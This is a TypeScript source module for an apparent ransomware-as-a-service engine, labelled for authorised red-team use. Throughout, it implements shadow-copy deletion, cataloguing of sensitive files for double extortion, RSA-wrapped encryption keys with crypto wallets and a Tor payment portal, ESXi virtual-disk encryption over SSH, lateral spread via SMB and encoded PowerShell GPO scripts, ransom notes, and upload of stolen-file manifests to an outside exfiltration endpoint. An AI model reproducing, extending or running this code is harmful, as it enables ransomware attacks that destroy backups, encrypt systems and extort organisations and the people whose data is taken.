/**
 * @module raas_engine
 * RaaS stack — VSS wipe, ESXi targeting, SMB/GPO spread, double-extortion catalog,
 * RSA-wrapped payment bundle. Destructive ops require live + forceLive.
 * FOR AUTHORISED RED-TEAM ONLY.
 */
import * as crypto from "node:crypto"
import * as fs from "node:fs"
import * as path from "node:path"
import * as os from "node:os"
import { execFileSync } from "node:child_process"
import { resolveLiveMode } from "./exec_options.ts"
import { isToolAvailable } from "./tool_detection.ts"
import {
  encryptFile,
  findTargetFiles,
  generateKey,
  generateRansomNote,
  type EncryptedFile,
  type RansomwareConfig,
} from "./ransomware.ts"
import {
  modifyGpoLogonScript,
  provisionTorPortal,
  deployEsxiEncryptor,
  uploadLeakManifestAdvanced,
} from "./raas_advanced.ts"
import { createWalletPair } from "./raas_wallet.ts"

export interface RaasOpts {
  live?: boolean
  forceLive?: boolean
  dryRun?: boolean
}

export interface LeakCatalogEntry {
  path: string
  size: number
  sha256: string
  mtime: string
  tags: string[]
}

export interface PaymentBundle {
  keyId: string
  rsaPublicKeyPem: string
  wrappedAesKeyHex: string
  aesKeyHex: string
  torPaymentId: string
  bitcoinAddress: string
  moneroAddress: string
  portalDescriptorPath: string
  torPortal?: { onionAddress: string; hiddenServiceDir: string; portalHtmlPath: string }
  walletIds?: { btc: string; xmr: string }
}

export interface VssWipeResult {
  executed: boolean
  dryRun: boolean
  platform: string
  commands: string[]
  output: string
  success: boolean
}

export interface EsxiEncryptResult {
  host: string
  dryRun: boolean
  vmdkPaths: string[]
  encrypted: EncryptedFile[]
  sshFindOutput: string
}

export interface SmbSpreadResult {
  targets: string[]
  dryRun: boolean
  command: string
  output: string
  success: boolean
}

export interface GpoSpreadResult {
  domain: string
  dryRun: boolean
  gpoScriptCommand: string
  ldapHints: string[]
  output: string
}

export interface RaasCampaignReport {
  phase: string
  dryRun: boolean
  vss: VssWipeResult
  leakCatalog: { count: number; manifestPath: string; totalBytes: number }
  payment: PaymentBundle
  esxi: EsxiEncryptResult | null
  smb: SmbSpreadResult | null
  exfilUpload: LeakUploadResult | null
  encryption: { filesAffected: number; keyId: string; notePaths: string[] }
  timestamp: string
}

const ESXI_EXTENSIONS = [".vmdk", ".vmx", ".vmsn", ".vmsd", ".nvram", ".vmem", ".vswp"]
const LEAK_TAG_RULES: Array<{ re: RegExp; tag: string }> = [
  { re: /password|credential|secret|\.pem|\.key/i, tag: "credentials" },
  { re: /financial|invoice|payroll|ssn|tax/i, tag: "financial" },
  { re: /patient|hipaa|medical|phi/i, tag: "healthcare" },
  { re: /contract|legal|nda|confidential/i, tag: "legal" },
  { re: /\.db$|\.sql$|\.mdb$/i, tag: "database" },
]

function destructive(opts: RaasOpts): boolean {
  const live = resolveLiveMode(opts)
  const force = opts.forceLive === true || process.argv.includes("--force-live")
  return live && force
}

function runCmd(cmd: string, args: string[], timeoutMs = 60000): { stdout: string; stderr: string; ok: boolean } {
  try {
    const stdout = execFileSync(cmd, args, { encoding: "utf8", timeout: timeoutMs, stdio: ["pipe", "pipe", "pipe"] })
    return { stdout, stderr: "", ok: true }
  } catch (e: unknown) {
    const err = e as { stdout?: string; stderr?: string }
    return { stdout: err.stdout ?? "", stderr: err.stderr ?? String(e), ok: false }
  }
}

/** T1490 — delete volume shadow copies (Windows). */
export function deleteVolumeShadowCopies(opts: RaasOpts = {}): VssWipeResult {
  const platform = os.platform()
  const commands =
    platform === "win32"
      ? ["vssadmin delete shadows /all /quiet", "wmic shadowcopy delete"]
      : []

  if (!destructive(opts)) {
    return { executed: false, dryRun: true, platform, commands, output: "live+forceLive required", success: false }
  }

  const outputs: string[] = []
  let success = false
  if (platform === "win32") {
    for (const line of commands) {
      const parts = line.split(" ")
      const r = runCmd(parts[0]!, parts.slice(1))
      outputs.push(r.stdout + r.stderr)
      if (r.ok) success = true
    }
  } else {
    outputs.push("VSS not applicable on this platform")
  }

  return { executed: true, dryRun: false, platform, commands, output: outputs.join("\n"), success }
}

/** Double extortion — catalog high-value files with real SHA-256 hashes. */
export function buildLeakCatalog(
  rootDir: string,
  opts: RaasOpts & { maxFiles?: number; outDir?: string } = {},
): { entries: LeakCatalogEntry[]; manifestPath: string; totalBytes: number } {
  const max = opts.maxFiles ?? 500
  const outDir = opts.outDir ?? path.join(process.cwd(), ".ourmine", "raas", "leak_catalog")
  fs.mkdirSync(outDir, { recursive: true })

  if (!fs.existsSync(rootDir)) {
    const manifestPath = path.join(outDir, `manifest_empty_${Date.now()}.json`)
    fs.writeFileSync(manifestPath, JSON.stringify({ rootDir, entries: [], totalBytes: 0 }, null, 2))
    return { entries: [], manifestPath, totalBytes: 0 }
  }

  const entries: LeakCatalogEntry[] = []
  let totalBytes = 0

  function tagFile(name: string): string[] {
    return LEAK_TAG_RULES.filter((r) => r.re.test(name)).map((r) => r.tag)
  }

  function walk(dir: string, depth = 0): void {
    if (entries.length >= max || depth > 8) return
    let list: fs.Dirent[]
    try {
      list = fs.readdirSync(dir, { withFileTypes: true })
    } catch {
      return
    }
    for (const ent of list) {
      if (entries.length >= max) break
      const full = path.join(dir, ent.name)
      if (ent.isDirectory()) {
        if (!["node_modules", ".git", "proc", "sys"].includes(ent.name)) walk(full, depth + 1)
      } else if (ent.isFile()) {
        try {
          const st = fs.statSync(full)
          if (st.size > 100 * 1024 * 1024) continue
          const buf = fs.readFileSync(full)
          entries.push({
            path: full,
            size: st.size,
            sha256: crypto.createHash("sha256").update(buf).digest("hex"),
            mtime: st.mtime.toISOString(),
            tags: tagFile(ent.name),
          })
          totalBytes += st.size
        } catch { /* skip */ }
      }
    }
  }

  walk(rootDir)
  const manifestPath = path.join(outDir, `manifest_${Date.now()}.json`)
  fs.writeFileSync(manifestPath, JSON.stringify({ rootDir, entries, totalBytes, generatedAt: new Date().toISOString() }, null, 2))
  fs.writeFileSync(path.join(outDir, "leak_portal_preview.html"), generateLeakPortalHtml(entries, totalBytes))

  return { entries, manifestPath, totalBytes }
}

export function generateLeakPortalHtml(entries: LeakCatalogEntry[], totalBytes: number): string {
  const sample = entries.slice(0, 50)
  return `<!DOCTYPE html><html><head><title>Exfiltration manifest (authorized lab)</title></head><body>
<h1>Double-extortion catalog preview</h1>
<p>Files indexed: ${entries.length} | Total: ${(totalBytes / 1024 / 1024).toFixed(2)} MB</p>
<table border="1"><tr><th>Path</th><th>Size</th><th>SHA256</th><th>Tags</th></tr>
${sample.map((e) => `<tr><td>${e.path}</td><td>${e.size}</td><td>${e.sha256.slice(0, 16)}…</td><td>${e.tags.join(",")}</td></tr>`).join("\n")}
</table></body></html>`
}

/** RSA-4096 wrap AES session key + payment portal descriptor. */
export function generatePaymentBundle(opts: RaasOpts & { outDir?: string } = {}): PaymentBundle {
  const outDir = opts.outDir ?? path.join(process.cwd(), ".ourmine", "raas", "payment")
  fs.mkdirSync(outDir, { recursive: true })

  const session = generateKey()
  const { publicKey, privateKey } = crypto.generateKeyPairSync("rsa", { modulusLength: 4096 })
  const pubPem = publicKey.export({ type: "spki", format: "pem" }).toString()
  const privPem = privateKey.export({ type: "pkcs8", format: "pem" }).toString()

  const wrapped = crypto.publicEncrypt(
    { key: publicKey, padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash: "sha256" },
    Buffer.from(session.key, "hex"),
  )

  const torPaymentId = `${crypto.createHash("sha256").update(pubPem).digest("hex").slice(0, 56)}.onion`

  const ephemeral = !destructive(opts)
  const wallets = createWalletPair({
    ephemeral,
    campaignId: session.id,
    live: opts.live,
    forceLive: opts.forceLive,
  })

  const portal = {
    keyId: session.id,
    torPaymentId,
    bitcoinAddress: wallets.btc.address,
    moneroAddress: wallets.xmr.address || null,
    xmrAvailable: wallets.xmr.source === "monero-cli",
    xmrError: wallets.xmr.error,
    walletIds: { btc: wallets.btc.id, xmr: wallets.xmr.id },
    wrappedAesKeyHex: wrapped.toString("hex"),
    createdAt: new Date().toISOString(),
  }

  const portalDescriptorPath = path.join(outDir, `payment_${session.id}.json`)
  fs.writeFileSync(portalDescriptorPath, JSON.stringify(portal, null, 2))
  if (destructive(opts)) {
    fs.writeFileSync(path.join(outDir, `rsa_private_${session.id}.pem`), privPem)
  }

  let torPortal: PaymentBundle["torPortal"]
  try {
    const tp = provisionTorPortal(
      { keyId: session.id, bitcoinAddress: portal.bitcoinAddress, moneroAddress: wallets.xmr.address || "" },
      { ...opts, outDir: path.join(outDir, "tor_hs", session.id) },
    )
    torPortal = { onionAddress: tp.onionAddress, hiddenServiceDir: tp.hiddenServiceDir, portalHtmlPath: tp.portalHtmlPath }
    portal.torPaymentId = tp.onionAddress
    fs.writeFileSync(portalDescriptorPath, JSON.stringify({ ...portal, torOnionLive: tp.onionAddress, torHiddenServiceDir: tp.hiddenServiceDir }, null, 2))
  } catch { /* tor portal optional */ }

  return {
    keyId: session.id,
    rsaPublicKeyPem: pubPem,
    wrappedAesKeyHex: wrapped.toString("hex"),
    aesKeyHex: destructive(opts) ? session.key : "",
    torPaymentId: torPortal?.onionAddress ?? torPaymentId,
    bitcoinAddress: portal.bitcoinAddress,
    moneroAddress: wallets.xmr.address || "",
    portalDescriptorPath,
    torPortal,
    walletIds: { btc: wallets.btc.id, xmr: wallets.xmr.id },
  }
}

/** ESXi — SSH find VM artifacts; encrypt when mounted locally or paths exist. */
export async function encryptEsxiDatastores(
  host: string,
  opts: RaasOpts & { sshUser?: string; mountPath?: string; maxFiles?: number } = {},
): Promise<EsxiEncryptResult> {
  const dryRun = !destructive(opts)
  let vmdkPaths: string[] = []
  let sshFindOutput = ""

  const mountPath = opts.mountPath ?? process.env.OURMINE_ESXI_MOUNT ?? ""
  if (mountPath && fs.existsSync(mountPath)) {
    vmdkPaths = findTargetFiles(mountPath, ESXI_EXTENSIONS)
  } else if (!dryRun && isToolAvailable("ssh")) {
    const user = opts.sshUser ?? "root"
    const r = runCmd("ssh", [
      "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=8",
      `${user}@${host}`,
      "find /vmfs/volumes -type f \\( -name '*.vmdk' -o -name '*.vmx' -o -name '*.nvram' \\) 2>/dev/null | head -100",
    ])
    sshFindOutput = r.stdout + r.stderr
    vmdkPaths = r.stdout.split("\n").map((l) => l.trim()).filter(Boolean)
  }

  const encrypted: EncryptedFile[] = []
  let esxiDeployOutput = ""
  if (destructive(opts)) {
    const key = generateKey()
    const keyBuf = Buffer.from(key.key, "hex")
    for (const p of vmdkPaths.slice(0, opts.maxFiles ?? 20)) {
      if (fs.existsSync(p)) encrypted.push(encryptFile(p, keyBuf, key.id, { live: true, forceLive: true }))
    }
    const deploy = deployEsxiEncryptor(host, key.id, opts)
    esxiDeployOutput = deploy.output
  }

  return { host, dryRun, vmdkPaths, encrypted, sshFindOutput: sshFindOutput + (esxiDeployOutput ? `\n${esxiDeployOutput}` : "") }
}

/** SMB lateral spread via netexec. */
export function spreadViaSmb(
  targets: string[],
  payloadCommand: string,
  opts: RaasOpts & { domain?: string; username?: string; password?: string } = {},
): SmbSpreadResult {
  const dryRun = !destructive(opts)
  const domain = opts.domain ?? "WORKGROUP"
  const user = opts.username ?? process.env.OURMINE_AD_USER ?? ""
  const pass = opts.password ?? process.env.OURMINE_AD_PASS ?? ""

  const bin = isToolAvailable("netexec") ? "netexec" : isToolAvailable("crackmapexec") ? "crackmapexec" : null
  const command = bin
    ? `${bin} smb ${targets.join(" ")} -d ${domain} -u '${user}' -p '***' -x "${payloadCommand}"`
    : "netexec not on PATH"

  if (dryRun || !bin) {
    return { targets, dryRun: true, command, output: dryRun ? "live+forceLive required" : "install netexec", success: false }
  }

  const args = ["smb", ...targets, "-d", domain, "-x", payloadCommand]
  if (user) args.push("-u", user)
  if (pass) args.push("-p", pass)
  const r = runCmd(bin, args, 120000)
  return { targets, dryRun: false, command, output: (r.stdout + r.stderr).slice(0, 4000), success: r.ok }
}

/** Upload leak manifest to configured exfil endpoint (HTTP POST). Requires live+forceLive. */
export interface LeakUploadResult {
  uploaded: boolean
  dryRun: boolean
  url: string
  statusCode: number | null
  bytes: number
  responseSnippet: string
  error?: string
}

export async function uploadLeakManifest(
  manifestPath: string,
  opts: RaasOpts & { uploadUrl?: string; bearerToken?: string; method?: string } = {},
): Promise<LeakUploadResult> {
  const url = opts.uploadUrl ?? process.env.OURMINE_LEAK_UPLOAD_URL ?? ""
  const empty = (error: string): LeakUploadResult => ({
    uploaded: false,
    dryRun: !destructive(opts),
    url,
    statusCode: null,
    bytes: 0,
    responseSnippet: "",
    error,
  })

  if (!url) return empty("Set OURMINE_LEAK_UPLOAD_URL or pass uploadUrl")
  if (!fs.existsSync(manifestPath)) return empty("manifest not found")

  const body = fs.readFileSync(manifestPath)
  if (!destructive(opts)) {
    return {
      uploaded: false,
      dryRun: true,
      url,
      statusCode: null,
      bytes: body.length,
      responseSnippet: "",
      error: "live+forceLive required for exfil upload",
    }
  }

  try {
    const headers: Record<string, string> = { "Content-Type": "application/json" }
    const token = opts.bearerToken ?? process.env.OURMINE_LEAK_UPLOAD_TOKEN
    if (token) headers.Authorization = `Bearer ${token}`
    const res = await fetch(url, { method: opts.method ?? "POST", headers, body })
    const text = (await res.text()).slice(0, 500)
    return {
      uploaded: res.ok,
      dryRun: false,
      url,
      statusCode: res.status,
      bytes: body.length,
      responseSnippet: text,
      error: res.ok ? undefined : `HTTP ${res.status}`,
    }
  } catch (e) {
    return { uploaded: false, dryRun: false, url, statusCode: null, bytes: body.length, responseSnippet: "", error: String(e) }
  }
}

/** GPO + optional DC deploy when DA/SMB creds present via netexec. */
export function deployGpoLogonScript(
  domain: string,
  scriptPayload: string,
  opts: RaasOpts & { dc?: string; username?: string; password?: string; ntHash?: string } = {},
): GpoSpreadResult & { deployed: boolean; smbOutput: string; gpoModified?: boolean; sysvolPath?: string } {
  const base = spreadViaGpo(domain, scriptPayload, opts)
  if (!destructive(opts)) {
    return { ...base, deployed: false, smbOutput: "live+forceLive required" }
  }

  const user = opts.username ?? process.env.OURMINE_AD_USER ?? ""
  const pass = opts.password ?? process.env.OURMINE_AD_PASS ?? ""
  const dc = opts.dc ?? domain

  if (!user || (!pass && !opts.ntHash)) {
    return { ...base, deployed: false, smbOutput: "OURMINE_AD_USER/PASS required for GPO deploy" }
  }

  const smb = spreadViaSmb([dc], base.gpoScriptCommand, { ...opts, domain, username: user, password: pass })

  const gpoMod = modifyGpoLogonScript(domain, scriptPayload, { ...opts, dc, username: user, password: pass })

  return {
    ...base,
    deployed: smb.success || gpoMod.smbUploaded,
    smbOutput: [smb.output, gpoMod.output].filter(Boolean).join("\n"),
    gpoModified: gpoMod.smbUploaded,
    sysvolPath: gpoMod.sysvolPath,
  }
}

/** GPO logon script — LDAP enumerate + deploy guidance. */
export function spreadViaGpo(domain: string, scriptPayload: string, opts: RaasOpts & { dc?: string } = {}): GpoSpreadResult {
  const dryRun = !destructive(opts)
  const dc = opts.dc ?? domain
  const ldapHints: string[] = []
  const gpoScriptCommand = `powershell -enc ${Buffer.from(scriptPayload, "utf16le").toString("base64")}`

  if (isToolAvailable("ldapsearch")) {
    const base = domain.split(".").map((p) => `DC=${p}`).join(",")
    const r = runCmd("ldapsearch", ["-x", "-H", `ldap://${dc}`, "-b", base, "(objectClass=groupPolicyContainer)", "distinguishedName"], 20000)
    ldapHints.push(...r.stdout.split("\n").filter((l) => l.startsWith("dn:")).slice(0, 10))
  }

  return {
    domain,
    dryRun,
    gpoScriptCommand,
    ldapHints,
    output: dryRun ? "live+forceLive for GPO deploy" : (ldapHints.length ? "GPO containers enumerated" : "ldapsearch unavailable"),
  }
}

/** Full RaaS campaign orchestrator. */
export async function runRaasCampaign(
  config: RansomwareConfig & {
    targetDir: string
    esxiHost?: string
    smbTargets?: string[]
    domain?: string
    forceLive?: boolean
    live?: boolean
  },
): Promise<RaasCampaignReport> {
  const opts: RaasOpts = { live: config.live, forceLive: config.forceLive }
  const dryRun = !destructive(opts)

  const vss = deleteVolumeShadowCopies(opts)
  const leakCatalog = buildLeakCatalog(config.targetDir, { ...opts, maxFiles: 200 })
  const payment = generatePaymentBundle(opts)

  const esxi = config.esxiHost ? await encryptEsxiDatastores(config.esxiHost, opts) : null
  const smb = config.smbTargets?.length
    ? spreadViaSmb(config.smbTargets, "cmd /c echo ourmine_raas_marker", { ...opts, domain: config.domain })
    : null

  const key = generateKey()
  const keyBuf = Buffer.from(key.key, "hex")
  const files = findTargetFiles(config.targetDir, config.targetExtensions)
  const encrypted: EncryptedFile[] = []
  const notePaths: string[] = []

  if (destructive(opts)) {
    for (const f of files) encrypted.push(encryptFile(f, keyBuf, key.id, { live: true, forceLive: true }))
    const note = generateRansomNote({ ...config, live: true, forceLive: true }, key.id)
    for (const d of [...new Set(encrypted.map((e) => path.dirname(e.originalPath)))]) {
      const np = path.join(d, "README_DECRYPT.txt")
      try { fs.writeFileSync(np, note); notePaths.push(np) } catch { /* skip */ }
    }
  }

  if (config.domain) deployGpoLogonScript(config.domain, "Write-Host ourmine_gpo_marker", opts)

  let exfilUpload: LeakUploadResult | null = null
  if (process.env.OURMINE_LEAK_UPLOAD_URL || process.env.OURMINE_S3_BUCKET || process.env.OURMINE_TOR_UPLOAD_URL) {
    exfilUpload = await uploadLeakManifestAdvanced(leakCatalog.manifestPath, opts)
  }

  return {
    phase: dryRun ? "assessment" : "executed",
    dryRun,
    vss,
    leakCatalog: { count: leakCatalog.entries.length, manifestPath: leakCatalog.manifestPath, totalBytes: leakCatalog.totalBytes },
    payment,
    esxi,
    smb,
    exfilUpload,
    encryption: { filesAffected: encrypted.length, keyId: key.id, notePaths },
    timestamp: new Date().toISOString(),
  }
}

export function assessRaasReadiness(targetDir: string): Record<string, unknown> {
  const backups = findTargetFiles(targetDir, [".bak", ".sql", ".vmdk", ".vhd", ".vhdx"])
  const docs = findTargetFiles(targetDir, [".doc", ".pdf", ".xlsx"])
  return {
    targetDir,
    encryptableBackups: backups.length,
    encryptableDocuments: docs.length,
    vssApplicable: os.platform() === "win32",
    netexecAvailable: isToolAvailable("netexec") || isToolAvailable("crackmapexec"),
    sshAvailable: isToolAvailable("ssh"),
    stack: ["vss_wipe", "leak_catalog", "rsa_payment", "esxi_encrypt", "smb_spread", "gpo_spread", "aes_encrypt"],
  }
}

export default {
  deleteVolumeShadowCopies,
  buildLeakCatalog,
  generatePaymentBundle,
  encryptEsxiDatastores,
  spreadViaSmb,
  spreadViaGpo,
  deployGpoLogonScript,
  uploadLeakManifest,
  runRaasCampaign,
  assessRaasReadiness,
  generateLeakPortalHtml,
}
